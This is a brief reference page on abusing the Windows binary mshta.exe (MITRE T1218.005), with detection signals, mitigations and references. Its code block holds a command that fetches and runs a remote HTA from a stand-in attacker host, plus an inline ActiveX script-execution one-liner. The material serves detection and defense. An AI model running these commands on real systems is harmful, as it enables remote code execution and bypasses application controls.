# mshta.exe — Living-off-the-Land Payload

> **⚠️ DISCLAIMER**: Educational purposes ONLY. Do not use without authorization.

## Overview
mshta.exe executes HTML Applications (HTA), which can contain VBScript or JavaScript.
Attackers use it to execute remote scripts while bypassing AppLocker and script restrictions.

## Common Abuse Patterns (for detection/defense reference)
```cmd
# Execute remote HTA
mshta.exe http://attacker.com/payload.hta

# Execute inline script
mshta.exe "javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'));"

# Execute local HTA
mshta.exe "C:\Users\Public\payload.hta"
```

## MITRE ATT&CK
- **T1218.005** — System Binary Proxy Execution: Mshta (Defense Evasion)

## Detection
- Monitor mshta.exe for all network connections
- Alert on mshta.exe spawned from Office applications, email clients
- mshta.exe downloading and executing content from internet
- Sysmon Event ID 1 with mshta.exe as image

## Mitigation
- Block mshta.exe via AppLocker/WDAC if not needed
- Email gateway: Block .hta file attachments
- Attack Surface Reduction rules

## References
- [MITRE T1218.005](https://attack.mitre.org/techniques/T1218/005/)
- [LOLBAS mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
